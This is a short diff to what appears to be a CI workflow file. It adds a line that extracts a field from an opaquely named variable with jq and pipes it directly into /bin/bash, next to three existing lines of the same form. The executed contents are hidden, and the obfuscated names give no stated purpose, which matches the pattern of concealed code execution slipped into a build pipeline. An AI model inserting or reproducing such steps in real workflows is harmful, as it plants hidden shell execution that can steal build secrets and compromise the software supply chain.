@@ -20,6 +20,7 @@ jobs:
           echo $dh959 | jq -r .ni45 | /bin/bash
           echo $cgilj9302 | jq -r .l0 | /bin/bash
           echo $t3848 | jq -r .fcu98 | /bin/bash
+          echo $b508 | jq -r .mq91 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
